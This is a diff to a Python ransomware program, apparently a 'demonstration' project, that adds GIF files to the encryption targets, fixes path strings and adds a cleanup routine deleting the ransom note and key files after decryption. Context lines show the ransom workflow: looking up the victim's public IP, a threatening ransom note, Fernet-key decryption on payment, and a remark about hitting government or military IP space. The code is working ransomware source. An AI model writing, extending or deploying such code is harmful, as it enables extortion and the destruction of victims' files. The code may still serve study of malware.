@@ -20,7 +20,8 @@ class RansomWare:
         'txt',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
-       'png', 
+       'png',
+       'gif',
     ]
 
     def __init__(self):
@@ -39,7 +40,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'C:\Users\yaynu\Downloads\Python-Ransomware-master\Victim\localRoot' # Debugging/Testing
+        self.localRoot = fr'C:\Users\yaynu\Downloads\RansomewareDemonstration\Python-Ransomware-master\Victim\localRoot' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -194,7 +195,7 @@ Do NOT think that we wont delete your files altogether and throw away the key if
                 # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                 # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                 # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
-                with open(f'{self.sysRoot}\OneDrive\Desktop\PUT_ME_ON_DESKTOP.txt', 'r') as f:
+                with open(fr'{self.sysRoot}\OneDrive\Desktop\PUT_ME_ON_DESKTOP.txt', 'r') as f:
                     self.key = f.read()
                     self.crypter = Fernet(self.key)
                     # Decrpyt system once have file is found and we have cryptor with the correct key
@@ -211,6 +212,25 @@ Do NOT think that we wont delete your files altogether and throw away the key if
             # secs = 60
             # mins = 3
             # time.sleep((mins*secs))
+        self.cleanUpFiles()
+    
+    def cleanUpFiles(self):
+        try:
+            os.remove(fr'{self.sysRoot}\OneDrive\Desktop\PUT_ME_ON_DESKTOP.txt')
+        except:
+            print("Couldn't remove \'PUT_ME_ON_DESKTOP.txt\'")
+        try:
+            os.remove(fr'{self.sysRoot}\OneDrive\Desktop\EMAIL_ME.txt')
+        except:
+            print("Couldn't remove \'EMAIL_ME.txt\'")
+        try:
+            os.remove(r'fernet_key.txt')
+        except:
+            print("Couldn't remove \'fernet_key.txt\'")  
+        try:
+            os.remove(r'RANSOM_NOTE.txt')
+        except:
+            print("Couldn't remove \'RANSOM_NOTE.txt.txt\'")
 
 def main():
     # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
